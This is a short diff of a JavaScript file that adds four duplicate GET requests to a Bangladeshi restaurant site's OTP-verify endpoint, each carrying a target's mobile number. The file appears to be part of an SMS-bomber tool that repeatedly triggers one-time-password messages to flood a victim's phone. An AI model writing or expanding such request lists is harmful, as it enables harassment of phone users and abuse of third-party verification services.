@@ -12,6 +12,18 @@ $(document).ready(() => {
             var c = 0;
 
             const APIS = [
+                 {
+                    method: 'GET',
+                    url: `https://www.ieatery.com.bd/otp-verify?phn=${mobile}`},
+                {
+                    method: 'GET',
+                    url: `https://www.ieatery.com.bd/otp-verify?phn=${mobile}`},
+                {
+                    method: 'GET',
+                    url: `https://www.ieatery.com.bd/otp-verify?phn=${mobile}`},
+                {
+                    method: 'GET',
+                    url: `https://www.ieatery.com.bd/otp-verify?phn=${mobile}`},
                 {
                     method: 'GET',
                     url: `https://www.ieatery.com.bd/otp-verify?phn=${mobile}`}
